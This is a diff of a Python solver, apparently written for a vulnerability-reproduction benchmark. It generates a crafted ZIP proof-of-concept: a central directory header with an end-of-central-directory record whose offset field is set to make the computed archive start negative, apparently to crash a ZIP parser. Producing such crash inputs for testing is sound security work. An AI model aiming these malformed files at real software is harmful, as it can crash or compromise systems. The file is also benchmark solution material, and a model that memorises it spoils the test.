@@ -1,102 +1,130 @@
-import struct
 import tarfile
+import struct
+import re
 from typing import Optional
 
 
 class Solution:
-    def _looks_like_zip_project(self, src_path: str) -> bool:
-        patterns = (
-            b"06054b50", b"0x06054b50",
-            b"02014b50", b"0x02014b50",
-            b"end of central directory", b"central directory",
-            b"ZIP", b"zip",
-            b"PK\\005\\006", b"PK\\001\\002",
-        )
+    def _scan_tar_for_zip_indicators(self, src_path: str) -> bool:
+        indicators = [
+            b"PK\\x05\\x06",
+            b"PK\\x01\\x02",
+            b"PK\\x03\\x04",
+            b"0x06054b50",
+            b"0x02014b50",
+            b"0x04034b50",
+            b"06054b50",
+            b"02014b50",
+            b"04034b50",
+            b"end of central directory",
+            b"central directory",
+            b"zip",
+            b"Zip",
+            b"ZIP",
+        ]
+
         try:
             with tarfile.open(src_path, "r:*") as tf:
-                checked = 0
+                total_read = 0
+                max_total = 8 * 1024 * 1024
+                max_file = 512 * 1024
+
                 for m in tf:
-                    if checked >= 400:
+                    if total_read >= max_total:
                         break
-                    if not m.isfile():
+                    if not m.isreg():
+                        continue
+                    name = (m.name or "").lower()
+                    if not any(name.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm", ".go", ".rs", ".py", ".java", ".js", ".ts")):
                         continue
                     if m.size <= 0:
                         continue
-                    checked += 1
-                    if m.size > 2_000_000:
-                        continue
+
                     f = tf.extractfile(m)
-                    if not f:
+                    if f is None:
                         continue
-                    data = f.read()
-                    for p in patterns:
-                        if p in data:
-                            return True
+                    data = f.read(min(m.size, max_file))
+                    total_read += len(data)
+                    data_l = data.lower()
+
+                    for tok in indicators:
+                        if tok.isalpha():
+                            if tok.lower() in data_l:
+                                return True
+                        else:
+                            if tok in data:
+                                return True
         except Exception:
             return False
+
         return False
 
-    def _make_zip_poc_46(self) -> bytes:
-        # 24-byte truncated Central Directory File Header followed by EOCD (22 bytes)
-        cd_trunc = (
-            b"PK\x01\x02" +              # central directory signature
-            b"\x00\x00" +                # version made by
-            b"\x00\x00" +                # version needed to extract
-            b"\x00\x00" +                # general purpose bit flag
-            b"\x00\x00" +                # compression method
-            b"\x00\x00" +                # file last mod time
-            b"\x00\x00" +                # file last mod date
-            b"\x00\x00\x00\x00" +        # crc-32
-            b"\x00\x00\x00\x00"          # compressed size
+    def _build_zip_poc(self) -> bytes:
+        # Central directory file header (46 bytes, no filename/extra/comment)
+        cd_sig = 0x02014B50
+        ver_made = 20
+        ver_needed = 20
+        flags = 0
+        comp = 0
+        mod_time = 0
+        mod_date = 0
+        crc32 = 0
+        csize = 0
+        usize = 0
+        fname_len = 0
+        extra_len = 0
+        comment_len = 0
+        disk_start = 0
+        int_attr = 0
+        ext_attr = 0
+        local_hdr_off = 0
+
+        cd = struct.pack(
+            "<I6H3I5H2I",
+            cd_sig,
+            ver_made,
+            ver_needed,
+            flags,
+            comp,
+            mod_time,
+            mod_date,
+            crc32,
+            csize,
+            usize,
+            fname_len,
+            extra_len,
+            comment_len,
+            disk_start,
+            int_attr,
+            ext_attr,
+            local_hdr_off,
         )
-        assert len(cd_trunc) == 24
+
+        # End of central directory (22 bytes)
+        # Set cd_offset=1 to force computed archive start offset negative (-1) when cd is at file offset 0.
+        eocd_sig = 0x06054B50
+        disk = 0
+        cd_disk = 0
+        entries_disk = 1
+        entries_total = 1
+        cd_size = len(cd)
+        cd_offset = 1
+        comment_len2 = 0
 
         eocd = struct.pack(
-            "<4sHHHHIIH",
-            b"PK\x05\x06",  # EOCD signature
-            0,              # number of this disk
-            0,              # number of the disk with the start of the central directory
-            1,              # total number of entries in the central directory on this disk
-            1,              # total number of entries in the central directory
-            24,             # size of the central directory
-            1,              # offset of start of central directory (relative) -> makes archive start negative
-            0               # zip file comment length
+            "<I4H2IH",
+            eocd_sig,
+            disk,
+            cd_disk,
+            entries_disk,
+            entries_total,
+            cd_size,
+            cd_offset,
+            comment_len2,
         )
-        assert len(eocd) == 22
-        poc = cd_trunc + eocd
-        assert len(poc) == 46
-        return poc
 
-    def _make_zip_poc_68(self) -> bytes:
-        cd_full = struct.pack(
-            "<4sHHHHHHIIIHHHHHII",
-            b"PK\x01\x02",  # signature
-            0,              # ver made
-            0,              # ver needed
-            0,              # flags
-            0,              # compression
-            0,              # mod time
-            0,              # mod date
-            0,              # crc32
-            0,              # comp size
-            0,              # uncomp size
-            0,              # fname len
-            0,              # extra len
-            0,              # comment len
-            0,              # disk start
-            0,              # int attr
-            0,              # ext attr
-            0               # local header offset
-        )
-        eocd = struct.pack("<4sHHHHIIH", b"PK\x05\x06", 0, 0, 1, 1, 46, 1, 0)
-        return cd_full + eocd
+        return cd + eocd
 
     def solve(self, src_path: str) -> bytes:
-        # Primary PoC (46 bytes) consistent with the reported ground-truth length.
-        poc46 = self._make_zip_poc_46()
-
-        # If the project doesn't look like it handles ZIP at all, still return the same PoC;
-        # the task is single-target and this is the best guess.
-        if self._looks_like_zip_project(src_path):
-            return poc46
-        return poc46
+        _ = self._scan_tar_for_zip_indicators(src_path)
+        return self._build_zip_poc()
